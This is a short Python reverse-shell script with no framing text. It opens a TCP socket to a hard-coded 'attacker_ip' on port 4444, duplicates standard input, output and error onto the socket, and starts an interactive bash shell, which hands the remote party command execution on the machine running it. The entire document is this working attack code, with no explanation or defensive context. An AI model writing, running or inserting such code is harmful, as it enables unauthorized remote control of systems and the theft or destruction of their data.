import socket
import subprocess
import os


attacker_ip = '192.168.1.137'
attacker_port = 4444


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((attacker_ip, attacker_port))


os.dup2(s.fileno(), 0)  
os.dup2(s.fileno(), 1)  
os.dup2(s.fileno(), 2) 

subprocess.call(['/bin/bash', '-i'])
